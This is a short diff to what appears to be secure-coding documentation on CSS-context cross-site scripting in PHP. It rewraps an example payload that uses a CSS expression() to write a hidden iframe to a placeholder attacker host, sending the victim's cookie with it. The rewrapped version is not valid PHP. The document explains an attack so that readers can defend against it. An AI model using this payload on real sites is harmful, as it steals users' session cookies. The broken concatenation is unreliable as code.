@@ -13,7 +13,9 @@ In the above, $colour is populated from a database of user preferances which inf
 
 .. code-block:: php
 
-    $colour = "expression(document.write('<iframe src=http://evilattacker.com?cookie=' + document.cookie.escape() + ' height=0 width=0 />'))";
+    $colour = "expression(document.write('<iframe src="
+        .= "http://evilattacker.com?cookie=' + document.cookie.escape() + "
+        .= "' height=0 width=0 />'))";
 
     <div style="background:<?php echo $colour ?>;">
 
